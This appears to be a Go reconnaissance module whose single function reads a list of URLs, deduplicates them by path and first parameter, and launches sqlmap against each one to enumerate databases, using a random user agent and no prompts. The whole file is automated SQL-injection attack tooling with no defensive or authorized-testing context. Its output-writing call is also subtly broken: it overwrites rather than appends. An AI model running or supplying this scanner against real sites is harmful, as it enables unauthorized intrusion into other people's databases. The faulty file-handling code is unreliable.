```go
package recon

import (
	"bufio"
	"os"
	"os/exec"
	"strings"
)

func ScanSQLi(inputFile, outputFile string) error {
	file, err := os.Open(inputFile)
	if err != nil {
		return err
	}
	defer file.Close()

	uniqueURLs := make(map[string]bool)
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		url := scanner.Text()
		if url == "" {
			continue
		}
		parts := strings.Split(url, "?")
		if len(parts) < 2 {
			continue
		}
		base := parts[0]
		params := strings.Split(parts[1], "&")[0]
		key := base + "?" + params
		uniqueURLs[key] = true
	}

	for url := range uniqueURLs {
		cmd := exec.Command("sqlmap", "-u", url, "--dbs", "--random-agent", "--batch")
		out, err := cmd.Output()
		if err != nil {
			continue
		}
		os.WriteFile(outputFile, out, 0644|os.ModeAppend)
	}
	return nil
}
```
